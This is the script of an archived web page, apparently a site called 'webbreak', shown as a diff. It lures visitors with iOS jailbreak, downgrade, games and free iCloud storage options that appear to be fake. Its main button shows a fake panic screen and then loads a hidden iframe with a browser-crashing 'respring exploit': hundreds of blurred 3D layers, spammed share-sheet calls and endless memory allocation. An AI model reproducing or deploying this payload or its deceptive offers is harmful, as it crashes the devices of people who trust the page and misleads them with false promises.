+      viewCreditsBtn.addEventListener('click', () => {
+        const viewCreditsLabel = viewCreditsBtn.querySelector('span');
+        const viewCreditsIcon = viewCreditsBtn.querySelector('i');
+
+        if (creditsSection.classList.contains('hidden')) {
+          creditsSection.classList.remove('hidden');
+          viewCreditsBtn.setAttribute('aria-expanded', 'true');
+          if (viewCreditsLabel) viewCreditsLabel.textContent = translations[currentLang].hideCredits;
+          if (viewCreditsIcon) viewCreditsIcon.setAttribute('data-lucide', 'chevron-up');
+          safeCreateIcons();
+          setTimeout(() => {
+            try {
+              creditsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            } catch (_) {
+              creditsSection.scrollIntoView();
+            }
+          }, 50);
+        } else {
+          creditsSection.classList.add('hidden');
+          viewCreditsBtn.setAttribute('aria-expanded', 'false');
+          if (viewCreditsLabel) viewCreditsLabel.textContent = translations[currentLang].viewCredits;
+          if (viewCreditsIcon) viewCreditsIcon.setAttribute('data-lucide', 'chevron-down');
+          safeCreateIcons();
+        }
+      });
+    }
+
+    // 3. Options Data
+    const DATA = {
+      jailbreak: [
+        {
+          id: "dopamine",
+          title: "Install Dopamine",
+          description: "Rootless jailbreak setup for modern supported iOS versions.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://raw.githubusercontent.com/opa334/Dopamine/2.x/Application/Dopamine/Assets.xcassets/AppIcon.appiconset/Icon-60%403x.png",
+          icon: "flask-conical",
+          recommended: true,
+          themeColor: "#22c55e" /* green */
+        },
+        {
+          id: "trollstore",
+          title: "Install TrollStore",
+          description: "Permanent app signing for sideloaded apps without regular certificate revokes.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://raw.githubusercontent.com/opa334/TrollStore/main/TrollStore/Resources/AppIcon60x60%403x.png",
+          icon: "gem",
+          themeColor: "#06b6d4" /* cyan */
+        },
+        {
+          id: "sileo",
+          title: "Install Sileo",
+          description: "Clean package manager for tweaks, repos, and essentials.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://raw.githubusercontent.com/Sileo/Sileo/main/Sileo/Assets.xcassets/AppIcon.appiconset/AppIcon60x60%403x.png",
+          icon: "box",
+          themeColor: "#3b82f6" /* blue */
+        },
+        {
+          id: "roothide",
+          title: "Enable RootHide",
+          description: "Reduce jailbreak detection in banking and game apps.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://theapplewiki.com/wiki/Special:Redirect/file/Dopamine-roothide_Icon.png",
+          icon: "lock-open",
+          themeColor: "#ef4444" /* red */
+        }
+      ],
+      downgrade: [
+        {
+          id: "dg_26_0_1",
+          title: "Downgrade to iOS 26.0.1",
+          description: "Newest branch with Lara-based rollback support.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://commons.wikimedia.org/wiki/Special:FilePath/Settings_(iOS).png",
+          icon: "download",
+          trackKey: "latest",
+          themeColor: "#60a5fa" /* iOS blue */
+        },
+        {
+          id: "dg_18_7_1",
+          title: "Downgrade to iOS 18.7.1",
+          description: "Clean iOS 18 build for users who want a familiar stable release.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://commons.wikimedia.org/wiki/Special:FilePath/Settings_(iOS).png",
+          icon: "download",
+          trackKey: "stable",
+          themeColor: "#38bdf8" /* sky */
+        },
+        {
+          id: "dg_18_5",
+          title: "Downgrade to iOS 18.5",
+          description: "Best all-around rollback version for stability and tweak support.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://commons.wikimedia.org/wiki/Special:FilePath/Settings_(iOS).png",
+          icon: "download",
+          recommended: true,
+          trackKey: "stable",
+          themeColor: "#818cf8" /* indigo */
+        },
+        {
+          id: "dg_18_3_1",
+          title: "Downgrade to iOS 18.3.1",
+          description: "Older iOS 18 build with broad compatibility and lighter visuals.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://commons.wikimedia.org/wiki/Special:FilePath/Settings_(iOS).png",
+          icon: "download",
+          trackKey: "balanced",
+          themeColor: "#a78bfa" /* violet */
+        },
+        {
+          id: "dg_17_0",
+          title: "Downgrade to iOS 17.0",
+          description: "Exclusive archive build for early iOS 17 compatibility testing.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://commons.wikimedia.org/wiki/Special:FilePath/Settings_(iOS).png",
+          icon: "download",
+          exclusive: true,
+          trackKey: "exclusive",
+          themeColor: "#fbbf24" /* gold */
+        },
+        {
+          id: "dg_16_5_1",
+          title: "Downgrade to iOS 16.5.1",
+          description: "Exclusive legacy build for older rootless workflows and app support.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://commons.wikimedia.org/wiki/Special:FilePath/Settings_(iOS).png",
+          icon: "download",
+          exclusive: true,
+          trackKey: "exclusive",
+          themeColor: "#f59e0b" /* amber */
+        }
+      ],
+      pcgames: [
+        {
+          id: "pc_gta5",
+          title: "Grand Theft Auto V",
+          description: "Open-world action with story missions and online play.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://cdn.cloudflare.steamstatic.com/steam/apps/271590/library_600x900.jpg",
+          icon: "car-front",
+          themeColor: "#f97316" /* orange */
+        },
+        {
+          id: "pc_minecraft",
+          title: "Minecraft",
+          description: "Build, craft, survive, and play with friends.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://minecraft.wiki/images/Java_Edition_icon_3.png",
+          icon: "pickaxe",
+          imageFit: "contain",
+          themeColor: "#16a34a" /* emerald */
+        },
+        {
+          id: "pc_rdr2",
+          title: "Red Dead Redemption 2",
+          description: "Story-driven western adventure in a huge open world.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://cdn.cloudflare.steamstatic.com/steam/apps/1174180/library_600x900.jpg",
+          icon: "crosshair",
+          themeColor: "#b91c1c" /* deep red */
+        },
+        {
+          id: "pc_rave",
+          title: "Rave",
+          description: "Watch videos and streams together with friends.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/9e/9e/14/9e9e1486-46e1-e1ed-ba47-5f619aca8318/AppIcon-0-0-1x_U007emarketing-0-0-0-8-0-0-85-220.png/512x512bb.jpg",
+          icon: "square-play",
+          imageFit: "contain",
+          recommended: true,
+          themeColor: "#ffffff" /* white */
+        },
+        {
+          id: "pc_ayugram",
+          title: "AyuGram",
+          description: "Telegram mod with extra privacy tools, UI customization, recall history, and flexible chat controls.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://avatars.githubusercontent.com/u/131606289?v=4",
+          icon: "message-circle-more",
+          imageFit: "contain-tight",
+          themeColor: "#60a5fa" /* telegram blue */
+        },
+        {
+          id: "pc_nugget",
+          title: "Nugget Mobile",
+          description: "Tweak toolkit for iOS 26.4.2 and earlier with Dynamic Island, hidden flags, and extra system options. <span class=\"desc-accent-purple\">Supports animated wallpapers.</span>",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://raw.githubusercontent.com/leminlimez/Nugget-Mobile/1881fdc2b721fd2675a2909e7fbc24769d11bb53/readme-images/icon.png",
+          icon: "sliders-horizontal",
+          imageFit: "contain",
+          themeColor: "#8b5cf6" /* violet */
+        }
+      ],
+      icloud: [
+        {
+          id: "icloud_32",
+          title: "32 GB iCloud",
+          description: "Entry cloud storage tier for light backups and extra files.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg",
+          icon: "cloud",
+          imageFit: "contain",
+          themeColor: "#8b5cf6" /* violet */
+        },
+        {
+          id: "icloud_64",
+          title: "64 GB iCloud",
+          description: "Balanced cloud plan for photos, backups, and daily storage.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg",
+          icon: "cloud",
+          imageFit: "contain",
+          themeColor: "#4f46e5" /* indigo */
+        },
+        {
+          id: "icloud_128",
+          title: "128 GB iCloud",
+          description: "Expanded cloud tier for larger media libraries and device backups.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg",
+          icon: "cloud",
+          imageFit: "contain",
+          themeColor: "#06b6d4" /* cyan */
+        },
+        {
+          id: "icloud_256",
+          title: "256 GB iCloud",
+          description: "High-capacity storage for photos, videos, and long-term syncing.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg",
+          icon: "cloud",
+          imageFit: "contain",
+          recommended: true,
+          themeColor: "#22c55e" /* green */
+        },
+        {
+          id: "icloud_512",
+          title: "512 GB iCloud",
+          description: "Large storage plan for heavy media use and multiple backups.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg",
+          icon: "cloud",
+          imageFit: "contain",
+          themeColor: "#f97316" /* orange */
+        },
+        {
+          id: "icloud_1tb",
+          title: "1 TB iCloud",
+          description: "Maximum rainbow tier for full cloud libraries and oversized backups.",
+          imgSrc: "https://web.archive.org/web/20260503211418/https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg",
+          icon: "cloud",
+          imageFit: "contain",
+          themeColor: "#ef4444" /* red */
+        }
+      ]
+    };
+
+    function getLocalizedItem(lang, option) {
+      const langMap = translations[lang];
+      const itemsMap = langMap && langMap.items;
+      const localized = itemsMap && itemsMap[option.id];
+      return localized || option;
+    }
+
+    const DOWNLOAD_BADGE_IDS = new Set(['pc_rave', 'pc_minecraft', 'pc_ayugram', 'pc_nugget']);
+
+    function getIconFitClass(option) {
+      if (option.imageFit === 'contain-tight') return 'is-contained is-tight';
+      if (option.imageFit === 'contain') return 'is-contained';
+      return '';
+    }
+
+    function buildOptionIconHTML(option, title, sizeClass = 'w-full h-full', iconSizeClass = 'w-6 h-6') {
+      if (option.imgSrc) {
+        const fitClass = getIconFitClass(option);
+        const imageClass = ['option-icon-asset', sizeClass, fitClass].filter(Boolean).join(' ');
+        return `<div class="relative ${sizeClass} flex items-center justify-center">
+          <i data-lucide="${option.icon}" class="${iconSizeClass} shrink-0 absolute opacity-50 z-0"></i>
+          <img src="https://web.archive.org/web/20260503211418im_/https://vityaig.github.io/${option.imgSrc}" alt="${title}" class="${imageClass}" style="opacity: 0;" onload="this.style.opacity='1'; this.previousElementSibling.style.display='none';" onerror="this.style.display='none'; this.previousElementSibling.classList.remove('opacity-50');" />
+        </div>`;
+      }
+
+      return `<i data-lucide="${option.icon}" class="${iconSizeClass} shrink-0"></i>`;
+    }
+
+    function hexToRgb(hex) {
+      const clean = hex.replace('#', '').trim();
+      const normalized = clean.length === 3
+        ? clean.split('').map(char => char + char).join('')
+        : clean;
+
+      const value = Number.parseInt(normalized, 16);
+      if (!Number.isFinite(value)) return null;
+
+      return {
+        r: (value >> 16) & 255,
+        g: (value >> 8) & 255,
+        b: value & 255
+      };
+    }
+
+    function mixRgb(from, to, amount) {
+      return {
+        r: Math.round(from.r + (to.r - from.r) * amount),
+        g: Math.round(from.g + (to.g - from.g) * amount),
+        b: Math.round(from.b + (to.b - from.b) * amount)
+      };
+    }
+
+    function rgbCss(color) {
+      return `rgb(${color.r}, ${color.g}, ${color.b})`;
+    }
+
+    function setAccentTheme(target, color) {
+      const rgb = hexToRgb(color);
+      if (!target || !rgb) return;
+
+      const black = { r: 0, g: 0, b: 0 };
+      const white = { r: 255, g: 255, b: 255 };
+
+      target.style.setProperty('--theme-color', color);
+      target.style.setProperty('--theme-rgb', `${rgb.r}, ${rgb.g}, ${rgb.b}`);
+      target.style.setProperty('--accent-deep', rgbCss(mixRgb(rgb, black, 0.58)));
+      target.style.setProperty('--accent-dark', rgbCss(mixRgb(rgb, black, 0.24)));
+      target.style.setProperty('--accent-soft', rgbCss(mixRgb(rgb, white, 0.62)));
+    }
+
+    const CATEGORY_THEME = {
+      jailbreak: { accent: '#22c55e', star: '#86efac' },
+      downgrade: { accent: '#60a5fa', star: '#93c5fd' },
+      pcgames: { accent: '#cbd5e1', star: '#e2e8f0' },
+      icloud: { accent: '#a78bfa', star: '#c4b5fd' }
+    };
+
+
+    // 4. Render Options List
+    const CATEGORY_ORDER = ['jailbreak', 'downgrade', 'pcgames', 'icloud'];
+    let selectedOptionId = null;
+    let currentCategory = 'jailbreak';
+    let categoryTransitionTimer = null;
+    let isTransitioningToJailbreak = false;
+    let isMainActionRunning = false;
+    const selectionScreen = document.getElementById('selection-screen');
+    const list = document.getElementById('options-list');
+    const continueBtnContainer = document.getElementById('continue-btn-container');
+    const continueBtn = document.getElementById('continue-btn');
+
+    function updateStepIndicator(step) {
+      const stepPairs = [
+        [document.getElementById('step-chip-1'), document.getElementById('step-chip-2')],
+        [document.getElementById('jb-step-chip-1'), document.getElementById('jb-step-chip-2')]
+      ];
+
+      stepPairs.forEach(([chip1, chip2]) => {
+        if (!chip1 || !chip2) return;
+        chip1.classList.toggle('is-active', step === 1);
+        chip2.classList.toggle('is-active', step === 2);
+      });
+    }
+
+    function applyCategoryTheme(category) {
+      const theme = CATEGORY_THEME[category] || CATEGORY_THEME.jailbreak;
+      document.body.dataset.category = category;
+      if (list) list.dataset.category = category;
+      setAccentTheme(selectionScreen, theme.accent);
+      setStarfieldColor(theme.star);
+    }
+
+    // Particle effects
+    function createParticles(x, y, color) {
+      if (prefersReducedMotion) return;
+
+      const particleCount = isLowPerfDevice ? (window.innerWidth < 640 ? 4 : 7) : (window.innerWidth < 640 ? 8 : 15);
+      const fragment = document.createDocumentFragment();
+      for (let i = 0; i < particleCount; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.backgroundColor = color;
+        p.style.setProperty('--theme-color', color);
+        
+        const angle = Math.random() * Math.PI * 2;
+        const dist = 30 + Math.random() * 60;
+        p.style.setProperty('--tx', `${Math.cos(angle) * dist}px`);
+        p.style.setProperty('--ty', `${Math.sin(angle) * dist}px`);
+        p.style.setProperty('--rot', `${Math.random() * 360}deg`);
+        
+        p.style.left = `${x}px`;
+        p.style.top = `${y}px`;
+        
+        fragment.appendChild(p);
+        setTimeout(() => p.remove(), isLowPerfDevice ? 420 : 600);
+      }
+
+      document.body.appendChild(fragment);
+    }
+
+    function renderOptions(category) {
+      if (!list) return;
+
+      list.dataset.category = category;
+      list.innerHTML = '';
+      if (selectedOptionId) {
+        list.classList.add('has-selection');
+      } else {
+        list.classList.remove('has-selection');
+      }
+
+      const options = DATA[category] || [];
+      const activeTranslations = translations[currentLang] || translations.en;
+      const recommendationLabel = activeTranslations.recommendedLabel || translations.en.recommendedLabel || 'Recommended';
+      const exclusiveLabel = activeTranslations.exclusiveLabel || translations.en.exclusiveLabel || 'Exclusive';
+
+      options.forEach(opt => {
+        const item = document.createElement('div');
+        item.className = 'option-item group';
+        item.dataset.id = opt.id;
+        item.tabIndex = 0;
+        item.setAttribute('role', 'button');
+        item.setAttribute('aria-pressed', 'false');
+        item.style.setProperty('--theme-color', opt.themeColor);
+
+        // Get localized text from translations object
+        const tItem = getLocalizedItem(currentLang, opt);
+        const mappedTitle = tItem.title;
+        const mappedDesc = tItem.description;
+        const iosAvailableLabel = DOWNLOAD_BADGE_IDS.has(opt.id)
+          ? (activeTranslations.raveDownloadAvailable || translations.en.raveDownloadAvailable || 'Доступно к скачиванию')
+          : (activeTranslations.iosAvailable || translations.en.iosAvailable || 'Доступно для iOS');
+        const badges = [];
+        if (opt.recommended && category !== 'pcgames') {
+          badges.push(`<span class="recommendation-badge">${recommendationLabel}</span>`);
+        }
+        if (opt.exclusive) {
+          badges.push(`<span class="exclusive-badge">${exclusiveLabel}</span>`);
+        }
+        if (category === 'downgrade' && opt.trackKey) {
+          const trackLabel = (activeTranslations.downgradeTrack && activeTranslations.downgradeTrack[opt.trackKey])
+            || (translations.en.downgradeTrack && translations.en.downgradeTrack[opt.trackKey])
+            || opt.trackKey;
+          const trackClass = opt.exclusive ? 'downgrade-track-badge is-gold' : 'downgrade-track-badge';
+          badges.unshift(`<span class="${trackClass}">${trackLabel}</span>`);
+        }
+        if (category === 'pcgames') {
+          badges.push(`<span class="ios-availability-badge">${iosAvailableLabel}</span>`);
+        }
+        const badgesHTML = badges.length ? `<div class="option-badge-row">${badges.join('')}</div>` : '';
+
+        // Р“РµРЅРµСЂРёСЂСѓРµРј РёРєРѕРЅРєСѓ (Р»РёР±Рѕ РєР°СЂС‚РёРЅРєР° РїРѕ СЃСЃС‹Р»РєРµ, Р»РёР±Рѕ РёРєРѕРЅРєР° lucide)
+        const iconHTML = buildOptionIconHTML(opt, mappedTitle);
+
+        item.innerHTML = `
+          <div class="option-glow"></div>
+          <div class="option-icon-wrapper">
+            ${iconHTML}
+          </div>
+          <div class="option-content">
+            <div class="option-title">${mappedTitle}</div>
+            <div class="option-desc">${mappedDesc}</div>
+            ${badgesHTML}
+          </div>
+          <div class="option-radio"></div>
+        `;
+        
+        item.addEventListener('click', (e) => {
+          if (item.classList.contains('selected')) {
+            item.classList.remove('selected');
+            item.setAttribute('aria-pressed', 'false');
+            selectedOptionId = null;
+            list.classList.remove('has-selection');
+            continueBtnContainer.classList.remove('visible');
+            continueBtn.setAttribute('aria-disabled', 'true');
+            continueBtn.disabled = true;
+          } else {
+            document.querySelectorAll('.option-item').forEach(el => {
+              el.classList.remove('selected');
+              el.setAttribute('aria-pressed', 'false');
+            });
+            item.classList.add('selected');
+            item.setAttribute('aria-pressed', 'true');
+            selectedOptionId = opt.id;
+            list.classList.add('has-selection');
+            updateContinueButtonText();
+            continueBtnContainer.classList.add('visible');
+            continueBtn.setAttribute('aria-disabled', 'false');
+            continueBtn.disabled = false;
+            
+            // Trigger particles using the mapped themeColor
+            if (e.clientX !== 0 && e.clientY !== 0) {
+              createParticles(e.clientX, e.clientY, opt.themeColor);
+            } else {
+               // Fallback if triggered via keyboard
+               const rect = item.getBoundingClientRect();
+               createParticles(rect.left + rect.width/2, rect.top + rect.height/2, opt.themeColor);
+            }
+          }
+        });
+
+        item.addEventListener('keydown', (event) => {
+          if (event.key !== 'Enter' && event.key !== ' ') return;
+          event.preventDefault();
+          item.click();
+        });
+
+        list.appendChild(item);
+      });
+
+      safeCreateIcons();
+    }
+    
+    renderOptions('jailbreak');
+    
+    // Category Navigation Logic
+    const tabsBox = document.getElementById('category-tabs');
+    const categoryPrevBtn = document.getElementById('category-prev');
+    const categoryNextBtn = document.getElementById('category-next');
+    const categoryCurrentLabel = document.getElementById('category-current-label');
+
+    function getCategoryIndex(category) {
+      const index = CATEGORY_ORDER.indexOf(category);
+      return index === -1 ? 0 : index;
+    }
+
+    function getCategoryDisplayName(category) {
+      const t = translations[currentLang] || translations.en;
+      if (category === 'downgrade') return t.tabDowngrade;
+      if (category === 'pcgames') return t.tabPcGames || translations.en.tabPcGames;
+      if (category === 'icloud') return t.tabIcloud || translations.en.tabIcloud;
+      return t.tabJailbreak;
+    }
+
+    function updateCategoryTabsUI() {
+      if (!tabsBox || !categoryCurrentLabel) return;
+      if (!categoryCurrentLabel.classList.contains('is-transitioning')) {
+        categoryCurrentLabel.textContent = getCategoryDisplayName(currentCategory);
+      }
+
+      const currentIndex = getCategoryIndex(currentCategory);
+      const prevIndex = (currentIndex - 1 + CATEGORY_ORDER.length) % CATEGORY_ORDER.length;
+      const nextIndex = (currentIndex + 1) % CATEGORY_ORDER.length;
+      if (categoryPrevBtn) categoryPrevBtn.setAttribute('aria-label', `Previous: ${getCategoryDisplayName(CATEGORY_ORDER[prevIndex])}`);
+      if (categoryNextBtn) categoryNextBtn.setAttribute('aria-label', `Next: ${getCategoryDisplayName(CATEGORY_ORDER[nextIndex])}`);
+    }
+
+    function animateCategoryLabel(nextCategory, isForward) {
+      if (!categoryCurrentLabel) return;
+      if (prefersReducedMotion) {
+        categoryCurrentLabel.textContent = getCategoryDisplayName(nextCategory);
+        return;
+      }
+
+      categoryCurrentLabel.classList.remove('is-forward', 'is-backward');
+      categoryCurrentLabel.classList.add('is-transitioning', isForward ? 'is-forward' : 'is-backward');
+
+      window.setTimeout(() => {
+        categoryCurrentLabel.textContent = getCategoryDisplayName(nextCategory);
+        categoryCurrentLabel.classList.remove('is-forward', 'is-backward');
+        categoryCurrentLabel.classList.add(isForward ? 'is-backward' : 'is-forward');
+
+        requestAnimationFrame(() => {
+          categoryCurrentLabel.classList.remove('is-transitioning', 'is-forward', 'is-backward');
+        });
+      }, 120);
+    }
+    
+    function switchCategory(newCategory) {
+      if (newCategory === currentCategory) return;
+      clearTimeout(categoryTransitionTimer);
+      
+      const previousIndex = getCategoryIndex(currentCategory);
+      const nextIndex = getCategoryIndex(newCategory);
+      const isForward = nextIndex > previousIndex;
+      animateCategoryLabel(newCategory, isForward);
+      currentCategory = newCategory;
+      
+      applyCategoryTheme(newCategory);
+      updateCategoryTabsUI();
+      updateMainButtonText();
+      updateCategorySpotlight();
+      
+      selectedOptionId = null;
+      continueBtnContainer.classList.remove('visible');
+      continueBtn.setAttribute('aria-disabled', 'true');
+      continueBtn.disabled = true;
+      list.classList.remove('has-selection');
+      
+      // Animate transition out
+      list.style.transition = 'all 0.2s ease-out';
+      list.style.opacity = '0';
+      list.style.transform = isForward ? 'translateX(-20px)' : 'translateX(20px)';
+      
+      categoryTransitionTimer = setTimeout(() => {
+        renderOptions(newCategory);
+        
+        // Prepare for slide in
+        list.style.transition = 'none';
+        list.style.transform = isForward ? 'translateX(20px)' : 'translateX(-20px)';
+        
+        // Force reflow
+        void list.offsetWidth;
+        
+        // Animate transition in
+        list.style.transition = 'all 0.4s cubic-bezier(0.22, 1, 0.36, 1)';
+        list.style.opacity = '1';
+        list.style.transform = 'translateX(0)';
+      }, 200);
+    }
+    
+    function switchRelativeCategory(direction) {
+      const currentIndex = getCategoryIndex(currentCategory);
+      const nextIndex = (currentIndex + direction + CATEGORY_ORDER.length) % CATEGORY_ORDER.length;
+      switchCategory(CATEGORY_ORDER[nextIndex]);
+    }
+
+    if (categoryPrevBtn) {
+      categoryPrevBtn.addEventListener('click', (event) => {
+        event.preventDefault();
+        switchRelativeCategory(-1);
+      });
+    }
+
+    if (categoryNextBtn) {
+      categoryNextBtn.addEventListener('click', (event) => {
+        event.preventDefault();
+        switchRelativeCategory(1);
+      });
+    }
+
+    // Explicitly initialize with user language state to set up checks and UI
+    const browserLang = navigator.language || navigator.userLanguage || 'en';
+    let savedLang = null;
+    try {
+      savedLang = localStorage.getItem('webbreak-lang');
+    } catch (_) {}
+    const initialLang = Object.prototype.hasOwnProperty.call(translations, savedLang) ? savedLang : (browserLang.toLowerCase().startsWith('ru') ? 'ru' : 'en');
+    applyLanguage(initialLang);
+    applyCategoryTheme(currentCategory);
+    updateStepIndicator(1);
+    updateCategoryTabsUI();
+    window.addEventListener('resize', updateCategoryTabsUI, { passive: true });
+
+    // 5. Continue Button logic
+    if (continueBtn) {
+      continueBtn.addEventListener('click', () => {
+        if (!selectedOptionId || isTransitioningToJailbreak) return;
+        isTransitioningToJailbreak = true;
+        updateStepIndicator(2);
+        continueBtn.disabled = true;
+        continueBtn.setAttribute('aria-disabled', 'true');
+        
+        const selScreen = document.getElementById('selection-screen');
+        const jbScreen = document.getElementById('jailbreak-screen');
+        if (!selScreen || !jbScreen) return;
+        
+        // Populate selected value in jailbreak screen
+        const selectedItemObj = (DATA[currentCategory] || []).find(o => o.id === selectedOptionId);
+        updateMainButtonText();
+        if (selectedItemObj) {
+          const jbSelectedValue = document.getElementById('jb-selected-value');
+          const mappedTitle = getLocalizedItem(currentLang, selectedItemObj).title;
+          const iconHTML = buildOptionIconHTML(selectedItemObj, mappedTitle, 'w-6 h-6', 'w-5 h-5');
+
+          if (jbSelectedValue) {
+            jbSelectedValue.innerHTML = `${iconHTML}<span class="text-base font-bold truncate drop-shadow-md" style="color: var(--theme-color, white);">${mappedTitle}</span>`;
+          }
+          safeCreateIcons();
+          
+          // Update accent colors for the final screen and button frame.
+          setAccentTheme(jbScreen, selectedItemObj.themeColor);
+          if (starCanvas) {
+            setStarfieldColor(selectedItemObj.themeColor);
+            boostStarfield(1.35);
+            starCanvas.classList.add('jb-active');
+          }
+        }
+        
+        selScreen.classList.add('fade-out');
+        
+        setTimeout(() => {
+          selScreen.style.display = 'none';
+          jbScreen.classList.add('active');
+          
+          // Show the selected container smoothly
+          setTimeout(() => {
+            const container = document.getElementById('jb-selected-container');
+            if (container) {
+              container.classList.remove('opacity-0', 'translate-y-4');
+              container.classList.add('opacity-100', 'translate-y-0');
+            }
+          }, 100);
+        }, 600);
+      });
+    }
+
+    const panicTemplates = [
+      'Fatal Error 0x3333',
+      'Entering Bootloop...',
+      'KERNEL_PANIC',
+      'OVERFLOW_DETECTION',
+      'STACK_COLLISION',
+      'MEMORY_CORRUPTION',
+      '0xFFFF_SYSTEM_HALT',
+      'CRITICAL_PROCESS_DIED',
+      'THREAD_STUCK_IN_DEVICE_DRIVER',
+      'BOOT_LOOP_DETECTED',
+      'FS_CORRUPTION',
+      'SYSTEM_FREEZE',
+      'HARDWARE_MALFUNCTION'
+    ];
+
+    let panicScreenStarted = false;
+
+    function startPanicScreen() {
+      if (panicScreenStarted) return;
+      panicScreenStarted = true;
+
+      const panicScreen = document.getElementById('panic-screen');
+      if (!panicScreen) return;
+
+      const fragment = document.createDocumentFragment();
+      const messageCount = isLowPerfDevice
+        ? Math.min(360, Math.max(160, Math.floor((window.innerWidth * window.innerHeight) / 2800)))
+        : Math.min(760, Math.max(260, Math.floor((window.innerWidth * window.innerHeight) / 1900)));
+
+      for (let i = 0; i < messageCount; i++) {
+        const span = document.createElement('span');
+        span.className = 'error-msg';
+        span.textContent = panicTemplates[Math.floor(Math.random() * panicTemplates.length)];
+        fragment.appendChild(span);
+      }
+
+      if (typeof panicScreen.replaceChildren === 'function') {
+        panicScreen.replaceChildren(fragment);
+      } else {
+        panicScreen.innerHTML = '';
+        panicScreen.appendChild(fragment);
+      }
+      document.body.classList.add('panic-active');
+      panicScreen.classList.add('active');
+      panicScreen.setAttribute('aria-hidden', 'false');
+    }
+
+    // 6. Main Jailbreak button
+    const jbBtn = document.getElementById('main-jailbreak-btn');
+    
+    if (jbBtn) {
+      jbBtn.addEventListener('click', (e) => {
+        if (isMainActionRunning) return;
+        isMainActionRunning = true;
+        jbBtn.disabled = true;
+        jbBtn.setAttribute('aria-busy', 'true');
+        
+        if (e.clientX !== 0 && e.clientY !== 0) {
+          createParticles(e.clientX, e.clientY, '#ffffff');
+        } else {
+           const rect = jbBtn.getBoundingClientRect();
+           createParticles(rect.left + rect.width/2, rect.top + rect.height/2, '#ffffff');
+        }
+
+        // Simulate click visual if active state un-focuses early
+        jbBtn.style.transform = 'translateZ(0) scale(1.04)';
+        setTimeout(() => {
+          jbBtn.style.transform = '';
+        }, 120);
+
+        const audio = document.getElementById('jb-audio');
+        const showPanicAfterSound = () => {
+          setTimeout(() => {
+            boostStarfield(1.8);
+            startPanicScreen();
+            
+            // Launch respring after panic screen fully loads (795ms total from now)
+            setTimeout(() => {
+              launchRespring();
+            }, 497);
+          }, 275);
+        };
+
+        if (!audio) {
+          showPanicAfterSound();
+          return;
+        }
+
+        try {
+          audio.currentTime = 0;
+        } catch (_) {}
+
+        const playPromise = audio.play();
+
+        if (playPromise && typeof playPromise.then === 'function') {
+          playPromise.then(showPanicAfterSound).catch(() => {
+            jbBtn.blur();
+            showPanicAfterSound();
+          });
+        } else {
+          showPanicAfterSound();
+        }
+      });
+    }
+
+    // Respring launch function
+    function launchRespring() {
+      // Create hidden iframe for respring exploit
+      const iframe = document.createElement('iframe');
+      iframe.id = 'respring-iframe';
+      iframe.style.cssText = 'position: fixed; top: 0; left: 0; width: 1px; height: 1px; border: none; opacity: 0.01; pointer-events: none; z-index: -1;';
+      iframe.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
+      
+      document.body.appendChild(iframe);
+
+      const respringScript = `
+        <html>
+        <body style="margin:0; overflow:hidden;">
+          <script>
+            const container = document.createElement('div');
+            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+            document.body.appendChild(container);
+
+            for (let i = 0; i < 500; i++) {
+              let d = document.createElement('div');
+              d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+              container.appendChild(d);
+            }
+
+            setInterval(() => {
+              try {
+                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+              } catch(e) {}
+              let x = new Uint8Array(1024 * 1024 * 20);
+              crypto.getRandomValues(x);
+            }, 0);
+          <\/script>
+        </body>
+        </html>
+      `;
+      
+      iframe.srcdoc = respringScript;
+    }
+
+</script>
+</body>
+</html>
+<!--
+     FILE ARCHIVED ON 21:14:18 May 03, 2026 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 11:22:04 Aug 15, 2026.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+-->
+<!--
+playback timings (ms):
+  capture_cache.get: 0.463
+  captures_list: 0.392
+  exclusion.robots: 0.035
+  exclusion.robots.policy: 0.028
+  esindex: 0.007
+  cdx.remote: 7.388
+  LoadShardBlock: 350.07 (3)
+  PetaboxLoader3.resolve: 306.372 (4)
+  PetaboxLoader3.datanode: 67.396 (4)
+  load_resource: 83.917
+-->
